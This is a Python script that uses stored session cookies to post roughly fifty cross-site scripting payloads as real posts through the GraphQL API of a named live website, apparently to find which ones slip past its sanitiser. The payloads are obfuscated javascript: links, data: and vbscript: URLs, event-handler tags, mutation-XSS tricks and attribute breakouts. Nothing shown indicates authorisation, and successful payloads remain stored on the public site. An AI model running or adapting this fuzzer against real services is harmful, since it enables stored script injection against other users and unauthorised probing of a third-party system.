#!/usr/bin/env python3
import requests, json, time
from urllib.parse import unquote
import os

COOKIES_FILE = os.path.join(os.path.dirname(__file__), "cookies.txt")
raw = open(COOKIES_FILE).read().strip()
cookies = {}
for part in raw.split(";"):
    part = part.strip()
    if "=" in part:
        name, _, value = part.partition("=")
        cookies[name.strip()] = unquote(value.strip())

session = requests.Session()
for name, value in cookies.items():
    session.cookies.set(name, value, domain="api.joyreactor.cc")
session.headers.update({
    "Content-Type": "application/json",
    "Origin": "https://joyreactor.cc",
    "Referer": "https://joyreactor.cc/",
})

payloads = [
    # control
    ("ctrl-plain",          "plain text"),
    ("ctrl-href-sq",        "<a href='#'>click</a>"),

    # javascript: — URL encoding (browser decodes %XX in href)
    ("js-urlenc-full",      "<a href='%6a%61%76%61%73%63%72%69%70%74%3aalert(1)'>x</a>"),
    ("js-urlenc-partial",   "<a href='java%73cript:alert(1)'>x</a>"),
    ("js-urlenc-colon",     "<a href='javascript%3aalert(1)'>x</a>"),
    ("js-urlenc-j",         "<a href='%6avascript:alert(1)'>x</a>"),
    ("js-dblenc",           "<a href='%256a%2561%2576%2561%2573%2563%2572%2569%2570%2574%253aalert(1)'>x</a>"),

    # javascript: — HTML entities (browser decodes in href)
    ("js-ent-j",            "<a href='&#106;avascript:alert(1)'>x</a>"),
    ("js-ent-full",         "<a href='&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)'>x</a>"),
    ("js-ent-hex",          "<a href='&#x6a;avascript:alert(1)'>x</a>"),
    ("js-ent-colon",        "<a href='javascript&#58;alert(1)'>x</a>"),
    ("js-ent-colon-hex",    "<a href='javascript&#x3a;alert(1)'>x</a>"),
    ("js-ent-mid",          "<a href='javas&#99;ript:alert(1)'>x</a>"),

    # javascript: — whitespace tricks (browsers strip these in href)
    ("js-tab",              "<a href='java\tscript:alert(1)'>x</a>"),
    ("js-lf",               "<a href='java\nscript:alert(1)'>x</a>"),
    ("js-cr",               "<a href='java\rscript:alert(1)'>x</a>"),
    ("js-tab-ent",          "<a href='java&#9;script:alert(1)'>x</a>"),
    ("js-lf-ent",           "<a href='java&#10;script:alert(1)'>x</a>"),
    ("js-cr-ent",           "<a href='java&#13;script:alert(1)'>x</a>"),
    ("js-spaces",           "<a href='  javascript:alert(1)'>x</a>"),
    ("js-nbsp",             "<a href='\xa0javascript:alert(1)'>x</a>"),
    ("js-tab-named",        "<a href='java&Tab;script:alert(1)'>x</a>"),
    ("js-nl-named",         "<a href='java&NewLine;script:alert(1)'>x</a>"),

    # javascript: — case tricks
    ("js-upper",            "<a href='JAVASCRIPT:alert(1)'>x</a>"),
    ("js-mixed",            "<a href='JaVaScRiPt:alert(1)'>x</a>"),
    ("js-upper-urlenc",     "<a href='JAVA%53CRIPT:alert(1)'>x</a>"),

    # javascript: — null byte / special chars
    ("js-null",             "<a href='" + chr(0) + "javascript:alert(1)'>x</a>"),
    ("js-null-mid",         "<a href='java" + chr(0) + "script:alert(1)'>x</a>"),
    ("js-null-ent",         "<a href='&#0;javascript:alert(1)'>x</a>"),
    ("js-soft-hyphen",      "<a href='java\xadscript:alert(1)'>x</a>"),
    ("js-zero-width",       "<a href='java​script:alert(1)'>x</a>"),

    # other protocols
    ("proto-data",          "<a href='data:text/html,<script>alert(1)</script>'>x</a>"),
    ("proto-data-b64",      "<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>x</a>"),
    ("proto-vbscript",      "<a href='vbscript:alert(1)'>x</a>"),

    # event handlers with single quotes on various tags
    ("ev-a-onclick",        "<a href='#' onclick='alert(1)'>x</a>"),
    ("ev-a-onmouse",        "<a href='#' onmouseover='alert(1)'>x</a>"),
    ("ev-svg-onload",       "<svg onload='alert(1)'>"),
    ("ev-img-onerror",      "<img src='x' onerror='alert(1)'>"),
    ("ev-body-onload",      "<body onload='alert(1)'>"),
    ("ev-details",          "<details open ontoggle='alert(1)'>"),
    ("ev-input",            "<input autofocus onfocus='alert(1)'>"),
    ("ev-video",            "<video src='x' onerror='alert(1)'>"),
    ("ev-audio",            "<audio src='x' onerror='alert(1)'>"),
    ("ev-iframe-src",       "<iframe src='javascript:alert(1)'>"),
    ("ev-object",           "<object data='javascript:alert(1)'>"),

    # mXSS — mutation via parser quirks
    ("mxss-comment",        "<!--<img src=-->--><img src=x onerror=alert(1)>"),
    ("mxss-table",          "<table><td><script>alert(1)</script></td></table>"),
    ("mxss-math",           "<math><mtext><script>alert(1)</script></mtext></math>"),

    # attribute injection — break out of expected context
    ("attr-break-dq",       'x" onmouseover="alert(1)'),
    ("attr-break-sq",       "x' onmouseover='alert(1)"),
    ("attr-break-tag",      "x><script>alert(1)</script>"),
    ("attr-break-img",      "x><img src=x onerror=alert(1)>"),
]

URL = "https://api.joyreactor.cc/graphql"
total = len(payloads)

for i, (label, text) in enumerate(payloads):
    body = {"query": f'mutation{{post(tags:[],text:{json.dumps(text)}){{post{{id text}}}}}}'}
    try:
        r = session.post(URL, json=body, timeout=10)
        if not r.text.strip():
            print(f"[{i+1:02d}/{total}] [empty]  {label}")
            time.sleep(2)
            continue
        d = r.json()
    except Exception as e:
        print(f"[{i+1:02d}/{total}] [error]  {label} — {e}")
        time.sleep(1)
        continue

    p = ((d.get("data") or {}).get("post") or {}).get("post") or {}
    if p.get("id"):
        print(f"[{i+1:02d}/{total}] [CREATED] {label}")
        print(f"           stored: {p.get('text','')[:100]}")
    else:
        err = (d.get("errors") or [{}])[0].get("message", "?")[:50]
        print(f"[{i+1:02d}/{total}] [blocked] {label} — {err}")
    time.sleep(0.3)
